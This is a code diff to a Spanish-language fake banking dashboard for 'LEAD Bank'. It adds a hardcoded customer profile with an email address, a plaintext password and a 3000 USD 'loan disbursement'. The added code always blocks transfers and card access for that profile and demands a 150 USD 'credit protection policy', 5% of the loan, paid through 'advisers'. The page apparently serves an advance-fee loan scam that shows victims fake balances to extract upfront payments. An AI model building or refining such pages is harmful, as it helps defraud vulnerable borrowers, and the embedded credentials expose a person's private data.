@@ -689,7 +689,7 @@
               </div>
               <div class="transfer-input-group" style="flex: 1;">
                 <label><i class="fas fa-calendar-alt"></i> Fecha</label>
-                <input type="date" value="2026-06-26">
+                <input type="date" value="2026-06-28">
               </div>
             </div>
 
@@ -769,6 +769,8 @@
       showTransfer: false,
       showSeguros: false,
       showAccount: false,
+      policyPrice: 100,
+      policyLabel: "$100.00 USD",
       transactions: [
         { desc: "Pago de obligaciones tributarias (Taxes)", amount: 337.00, date: "2026-04-29", type: "negative" },
         { desc: "Transferencia internacional recibida", amount: 337.00, date: "2026-04-29", type: "positive" },
@@ -790,6 +792,8 @@
       showTransfer: true,
       showSeguros: true,
       showAccount: true,
+      policyPrice: 100,
+      policyLabel: "$100.00 USD",
       transactions: [
         { desc: "Pago de obligaciones tributarias (Taxes)", amount: 337.00, date: "2026-04-29", type: "negative" },
         { desc: "Transferencia internacional recibida", amount: 337.00, date: "2026-04-29", type: "positive" },
@@ -811,8 +815,28 @@
       showTransfer: true,
       showSeguros: true,
       showAccount: false,
+      policyPrice: 100,
+      policyLabel: "$100.00 USD",
       transactions: [
         { desc: "Desembolso del crédito LEAD Bank", amount: 1600.00, date: "2026-06-26", type: "positive" }
+      ] 
+    },
+    // PERFIL 4: Domingo Cepeda - CON PÓLIZA (5% = $150)
+    { 
+      username: "Dmngcepeda@gmail.com", 
+      password: "Domingo2026!", 
+      name: "Domingo Cepeda", 
+      cardHolder: "DOMINGO CEPEDA", 
+      balance: 3000.00,
+      profileType: "policy_required",
+      blockMessage: "🔒 Requerimiento de la póliza de protección de crédito · Adquiere tu póliza para desbloquear todas las funciones",
+      showTransfer: true,
+      showSeguros: true,
+      showAccount: false,
+      policyPrice: 150,
+      policyLabel: "$150.00 USD (5% del crédito)",
+      transactions: [
+        { desc: "Desembolso del crédito LEAD Bank", amount: 3000.00, date: "2026-06-28", type: "positive" }
       ] 
     }
   ];
@@ -892,7 +916,6 @@
     const container = document.getElementById('accountDetailsContainer');
     
     if (user.showAccount) {
-      // Perfil con datos visibles (invitado)
       container.innerHTML = `
         <div class="account-details">
           <div class="account-title"><i class="fas fa-university"></i> Datos de tu cuenta</div>
@@ -919,7 +942,6 @@
         </div>
       `;
     } else {
-      // Perfiles sin datos bancarios (Francisco Mejía y José Agüero)
       container.innerHTML = '';
     }
   }
@@ -940,7 +962,6 @@
       document.getElementById('loanDate').innerText = formattedDate;
     }
     
-    // Mostrar badge de activación si es perfil pending
     const badgeContainer = document.getElementById('activationBadgeContainer');
     if (user.profileType === "pending") {
       badgeContainer.innerHTML = `
@@ -953,10 +974,8 @@
       badgeContainer.innerHTML = '';
     }
     
-    // Renderizar datos de cuenta
     renderAccountDetails(user);
     
-    // Transacciones
     let html = '';
     const sortedTransactions = [...user.transactions].sort((a, b) => new Date(b.date) - new Date(a.date));
     const monthNames = ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'];
@@ -984,7 +1003,6 @@
     document.getElementById('transactionsContainer').innerHTML = html;
     document.getElementById('transactionsCount').innerText = user.transactions.length;
     
-    // Ocultar/mostrar secciones según perfil
     const transferSection = document.getElementById('transferenciasSection');
     const segurosSection = document.getElementById('segurosSection');
     const navTransfer = document.querySelector('.nav-item-floating[data-action="transferencias"]');
@@ -998,7 +1016,6 @@
       if (navSeguros) navSeguros.style.display = 'flex';
     }
     
-    // Actualizar póliza
     updatePolizaContent(user);
   }
 
@@ -1041,6 +1058,11 @@
         </div>
       `;
     } else if (user.profileType === "policy_required") {
+      // Para Domingo Cepeda - mensaje especial de asesor
+      const buyMessage = user.username === "Dmngcepeda@gmail.com" 
+        ? 'Comunícate con uno de nuestros asesores para activar tu póliza hoy mismo'
+        : '🔓 Adquirir póliza ahora';
+      
       container.innerHTML = `
         <div class="insurance-card featured" style="border-color: #c7254e; background: linear-gradient(135deg, #ffffff 0%, #fdf0f0 100%);">
           <div class="insurance-header">
@@ -1053,6 +1075,7 @@
           <div class="insurance-description">
             <strong>🔒 Requerimiento de la póliza de protección de crédito</strong><br><br>
             Para acceder a todas las funciones de LEAD Bank, es necesario adquirir la Póliza de Protección de Crédito.<br><br>
+            ${user.username === "Dmngcepeda@gmail.com" ? 'El costo de esta póliza corresponde al <strong>5% del crédito otorgado</strong>.' : ''}
             Esta póliza te brinda seguridad y respaldo ante cualquier imprevisto, protegiendo tu inversión y tu tranquilidad.
           </div>
           <div class="insurance-benefits" style="background: #fdf0f0;">
@@ -1066,9 +1089,9 @@
           </div>
           <div class="insurance-price">
             <div>
-              <span class="price">$100.00 USD</span>
+              <span class="price">${user.policyLabel || '$100.00 USD'}</span>
             </div>
-            <button class="btn-buy" id="btnComprarPoliza">🔓 Adquirir póliza ahora</button>
+            <button class="btn-buy" id="btnComprarPoliza">${buyMessage}</button>
           </div>
           <p style="font-size: 0.6rem; color: #c7254e; text-align: center; margin-top: 0.5rem;">
             ⚠️ Sin esta póliza no podrás acceder a todas las funciones de LEAD Bank
@@ -1078,7 +1101,12 @@
       const buyBtn = document.getElementById('btnComprarPoliza');
       if (buyBtn) {
         buyBtn.addEventListener('click', () => {
-          showBlockToast();
+          // Para Domingo Cepeda - mensaje especial
+          if (user.username === "Dmngcepeda@gmail.com") {
+            showToast('📞 Comunícate con uno de nuestros asesores para activar tu póliza hoy mismo');
+          } else {
+            showBlockToast();
+          }
           resetInactivityTimer();
         });
       }
@@ -1169,6 +1197,8 @@
       transferBtn.addEventListener('click', () => {
         if (currentUser && currentUser.profileType === "pending") {
           showBlockToast();
+        } else if (currentUser && currentUser.profileType === "policy_required") {
+          showBlockToast();  // Siempre muestra el error de póliza, no "Transferencia exitosa"
         } else {
           showToast('✅ Transferencia en proceso...');
           setTimeout(() => {
@@ -1245,6 +1275,8 @@
   document.getElementById('revealCardBtn').onclick = function() { 
     if (currentUser && currentUser.profileType === "pending") {
       showBlockToast(); 
+    } else if (currentUser && currentUser.profileType === "policy_required") {
+      showBlockToast();
     } else {
       showToast('✅ Datos de la tarjeta revelados');
       document.getElementById('modalCvv').innerText = '123';
@@ -1260,7 +1292,7 @@
       else if (action === 'ajustes') { showSection('ajustes'); document.querySelector('.dashboard-content')?.scrollTo({ top: 0, behavior: 'smooth' }); }
       else if (action === 'prestamos') { showSection('prestamos'); document.querySelector('.dashboard-content')?.scrollTo({ top: 0, behavior: 'smooth' }); }
       else if (action === 'transferencias') { 
-        if (currentUser && currentUser.profileType === "pending") {
+        if (currentUser && (currentUser.profileType === "pending" || currentUser.profileType === "policy_required")) {
           showBlockToast();
           return;
         }
